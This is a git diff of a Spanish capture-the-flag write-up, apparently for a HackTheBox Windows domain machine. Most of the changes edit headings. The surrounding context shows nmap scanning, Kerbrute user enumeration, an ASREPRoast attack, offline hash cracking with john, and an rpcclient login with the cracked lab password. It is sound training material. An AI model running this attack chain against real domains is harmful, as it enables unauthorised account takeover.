@@ -4,11 +4,14 @@ published: true
 ---
 
 
-## [](#header-2)Fase de reconocimiento
+## [](#header-2)reconocimiento
+
+- nmap
 
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.192 -oG ports
 
 nmap -sCV -p<ports> 10.10.10.192 -oN scanports
+
 
 - `Puertos abiertos, por donde se puede atacar`
 
@@ -16,6 +19,8 @@ nmap -sCV -p<ports> 10.10.10.192 -oN scanports
   - puerto 445 -> smb
   - puerto 5985 -> winrm
   - puerto 389 -> ldap
+
+## [](##header-2)enumeracion
 
 - `Primero vamos a enumerar el puerto smb`
 
@@ -59,7 +64,7 @@ que ver cuales son validas con el `DC (Domain Controller)`
 este oneliner nos va a volcar solo la parte de los usuarios y nos va a guardar
 en users.txt
 
-## [](header-2)Kerbrute
+## [](##header-2)Kerbrute
 
 Esta herramienta es de impacket o tambien lo pueden bajar desde el repositorio de ropnop en github
 
@@ -74,7 +79,7 @@ Esta herramienta es de impacket o tambien lo pueden bajar desde el repositorio d
 
 tenemos 3 usuarios validos del dominio
 
-## [](header-2)ASREPRoast Attack
+## [](##header-2)ASREPRoast Attack
 
        GetNPUsers.py blackfield.local/ -no-pass -usersfile users.valid
 
@@ -88,7 +93,7 @@ tenemos 3 usuarios validos del dominio
 
 y logramos visualizar un hash que podemos crackear con john the ripper
 
-## [](header-2)Cracking Hash
+## [](##header-2)Cracking Hash
 
       john --wordlist=/usr/share/wordlists/rockyou.txt hash
       Using default input encoding: UTF-8
@@ -109,7 +114,7 @@ y tuvimos exito en romper el hash -> support:#00^BlackKnight
 
       ES VALIDA!!!
 
-## [](header-2)Enumeracion con credenciales validas
+## [](##header-2)Enumeracion con credenciales validas
 
      rpcclient -U "support%#00^BlackKnight" 10.10.10.192
      rpcclient $> enumdomusers
